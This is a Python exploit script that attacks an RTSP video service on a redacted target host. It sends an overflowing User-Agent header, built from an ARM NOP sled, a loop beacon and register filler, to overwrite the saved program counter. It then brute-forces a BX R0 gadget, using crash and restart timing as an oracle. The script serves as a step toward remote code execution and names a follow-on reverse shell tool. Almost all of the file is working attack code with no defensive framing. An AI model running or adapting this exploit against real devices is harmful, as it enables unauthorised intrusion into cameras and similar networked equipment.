#!/usr/bin/env python3
"""
rtsp_bxr0_scan.py — BX R0 / BLX R0 gadget scan (ret2reg approach)

HYPOTHESIS: After strcpy(ua_buf, value), R0 = ua_buf.
  If true: jump to any "BX R0" or "BLX R0" gadget → CPU branches to ua_buf.

BEACON: ARM_LOOP (B .) — infinite loop
  DEAD (>20s no restart) = loop running = BX R0 gadget found + R0=ua_buf → RCE!
  HIT  (~9.7s restart)   = not a gadget / R0 ≠ ua_buf

NULL-BYTE CONSTRAINT: strcpy stops at 0x00.
  Gadget address must have NO 0x00 bytes in little-endian encoding.

PAYLOAD (252 bytes total):
  [0-101]:   ua_buf — NOP×24 + LOOP + \x01\x01 (LOOP runs if R0=ua_buf + BX R0)
  [102-215]: locals  — 'B' × 114 (null-free filler)
  [216-247]: R4-R11  — ARM_NOP × 8 = 0xe1a01001 (kernel-space, terminates FP
                        cascade immediately → clean 9.7s HIT for non-gadgets)
  [248-251]: saved PC — gadget_addr

ORACLE (poll_timeout=20s):
  DEAD (>20s):  loop running → BX R0 gadget at addr + R0=ua_buf → RCE!
  HIT  (<15s):  crash + watchdog restart → not a gadget
  SLOW (15-20s): slow cascade (shouldn't occur with kernel-space R4-R11)

Usage: python3 -u rtsp_bxr0_scan.py 2>&1 | tee /tmp/bxr0_out.txt
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

# ─── ARM constants ────────────────────────────────────────────────────────────

ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1, R1  — LE word = 0xe1a01001 (kernel space)
ARM_LOOP = b'\xfe\xff\xff\xea'   # B .  (infinite loop)

# ─── ua_buf: NOP sled + LOOP (102 bytes, null-free) ──────────────────────────
# If R0=ua_buf and we hit a BX R0 gadget, CPU runs NOPs then hits LOOP → spins.
_nops = (102 - len(ARM_LOOP) - 2) // 4   # = (102 - 4 - 2) // 4 = 24
LOOP_SC = ARM_NOP * _nops + ARM_LOOP + b'\x01\x01'
assert len(LOOP_SC) == 102,  f"LOOP_SC len={len(LOOP_SC)}"
assert 0 not in LOOP_SC,     "LOOP_SC has null bytes!"

# ─── Payload construction ────────────────────────────────────────────────────

def make_payload(addr):
    """
    252-byte payload:
      [0-101]   ua_buf:  LOOP_SC (102 bytes, null-free)
      [102-215] locals:  b'B' × 114 (null-free)
      [216-247] R4-R11:  ARM_NOP × 8 = 0xe1a01001 each (kernel space, null-free)
      [248-251] PC:      addr (null-free)
    """
    locals_fill = b'\x42' * 114                     # 0x42 = 'B', non-null
    reg_fill    = ARM_NOP * 8                        # 0xe1a01001 = kernel space × 8
    assert len(locals_fill) == 114
    assert len(reg_fill)    == 32
    assert 0 not in locals_fill
    assert 0 not in reg_fill

    corrupt = locals_fill + reg_fill                 # 146 bytes
    base    = LOOP_SC + corrupt                      # 248 bytes = PC_OFFSET
    assert len(base) == PC_OFFSET
    assert 0 not in struct.pack('<I', addr), f"addr 0x{addr:08x} has null bytes!"
    return base + struct.pack('<I', addr)

# ─── Network helpers ─────────────────────────────────────────────────────────

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=60, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2: print(f"  [✓] RTSP alive ({label}) — {e:.1f}s", flush=True)
            return True
        time.sleep(0.8)
    print(f"  [✗] RTSP dead after {max_wait}s ({label})", flush=True)
    return False

def probe(addr, poll_timeout=20):
    """
    Returns (elapsed, tag):
      DEAD (>poll_timeout):  loop running → BX R0 gadget + R0=ua_buf → RCE!
      HIT  (<15s):           crash + watchdog → not a gadget
      SLOW (15-20s):         slow FP cascade (unexpected with kernel-space R4-R11)
      SKIP:                  target unreachable
    """
    if not wait_rtsp(60, "pre"):
        return None, "SKIP"
    payload = make_payload(addr)
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE    = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.3)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "HIT" if t < 15 else "SLOW"
                return t, tag
        except: pass
    t = time.time() - t0
    return t, "DEAD"

# ─── Candidate generation ─────────────────────────────────────────────────────

def gen_candidates(lo=0x40000000, hi=0x40F30000, step=0x8005, max_count=None):
    """4-aligned, null-byte-free addresses in mmap region."""
    cands = []
    addr = lo
    while addr < hi:
        if addr % 4 == 0 and 0 not in struct.pack('<I', addr):
            cands.append(addr)
            if max_count and len(cands) >= max_count:
                break
        addr += step
    return cands

# ─── Main ─────────────────────────────────────────────────────────────────────

STEP      = 0x1001  # ~4KB step → ~938 candidates (denser scan)
START_IDX = 0       # Set >0 to resume a previously interrupted scan

candidates = gen_candidates(step=STEP)
print("=" * 65)
print("BX R0 / BLX R0 Gadget Scanner  [LOOP beacon]")
print(f"  ua_buf: NOP×24 + LOOP (runs forever if BX R0 hit + R0=ua_buf)")
print(f"  R4-R11: ARM_NOP×8 = 0xe1a01001 (kernel space → fast 9.7s crash)")
print(f"  DEAD (>20s no restart) = BX R0 GADGET FOUND → RCE PATH PROVEN!")
print(f"  HIT  (<15s restart)    = not a BX R0 gadget")
print(f"  Step=0x{STEP:x} | Candidates: {len(candidates)}")
if START_IDX:
    print(f"  Resuming from index {START_IDX} (0x{candidates[START_IDX]:08x})")
print(f"  Worst-case: ~{len(candidates)*10//60}min  (found early: much faster)")
print("=" * 65)

wait_rtsp(120, "start")
print()

# ─── Baseline sanity check ────────────────────────────────────────────────────
# 0x40111104 should NOT be a BX R0 gadget → expect HIT (~9.7s), NOT DEAD
baseline_addr = 0x40111104
if 0 not in struct.pack('<I', baseline_addr):
    print(f"[Baseline] PC=0x{baseline_addr:08x} — expect HIT (~9.7s), NOT DEAD")
    t, tag = probe(baseline_addr, poll_timeout=20)
    t_str = f"{t:.1f}s" if t is not None else "?"
    print(f"  Baseline: {tag} ({t_str})")
    if tag == "DEAD":
        print()
        print("  *** BASELINE = DEAD — unexpected! ***")
        print("  Either 0x40111104 IS a BX R0 gadget (R0=ua_buf confirmed!)")
        print("  OR the oracle is still misconfigured.")
        print()
        print("  Treating baseline DEAD as possible RCE — stopping here.")
        print(f"  If RCE confirmed: use this address as gadget in reverse shell")
        sys.exit(0)
    elif tag == "SLOW":
        print(f"  *** SLOW baseline ({t_str}) — FP cascade still leaking! ***")
        print(f"  R4-R11 = 0xe1a01001 should be kernel space.  Proceeding anyway.")
        print(f"  Will distinguish DEAD (>20s) from SLOW (15-20s) in scan.")
    print()

# ─── Main scan ────────────────────────────────────────────────────────────────
print(f"[Scan] 0x40000000–0x40F30000, step=0x{STEP:x}")
print("  Stopping at first DEAD (= loop running = RCE!)\n")

found = None
for i, addr in enumerate(candidates[START_IDX:], start=START_IDX):
    t, tag = probe(addr, poll_timeout=20)
    t_str = f"{t:.1f}s" if t is not None else "?"
    marker = "  [★★★ DEAD]" if tag == "DEAD" else "           "
    print(f"{marker} [{i+1:3d}/{len(candidates)}] 0x{addr:08x}: {t_str:6s}  [{tag}]",
          flush=True)

    if tag == "DEAD":
        found = addr
        break
    elif tag == "SKIP":
        wait_rtsp(120, "recovery")
    elif tag == "SLOW":
        wait_rtsp(60, f"slow recovery after 0x{addr:08x}")

print()
if found:
    print("=" * 65)
    print(f"*** BX R0 GADGET CONFIRMED at 0x{found:08x} ***")
    print(f"    Loop shellcode is running in ua_buf → R0=ua_buf proven!")
    print()
    print(f"  Next step: build reverse shell payload")
    print(f"  python3 rtsp_revshell.py --gadget 0x{found:08x} --lhost <your_ip>")
    print("=" * 65)
else:
    print(f"No DEAD after {len(candidates)} probes.")
    print()
    print("Possible causes:")
    print("  1. R0 ≠ ua_buf after strcpy → ret2reg via R0 doesn't work")
    print("     → try R1, R2, R4 (we control R4 via bytes 216-219)")
    print("  2. No BX R0 gadget in tested region with this step size")
    print("     → rerun with denser step (0x1001 or 0x401)")
    print("  3. Code at tested addresses jumps away before BX R0")
    print()
    print("  Next: try denser scan  python3 rtsp_bxr0_scan.py  (step=0x1001)")

print("\nDone.")
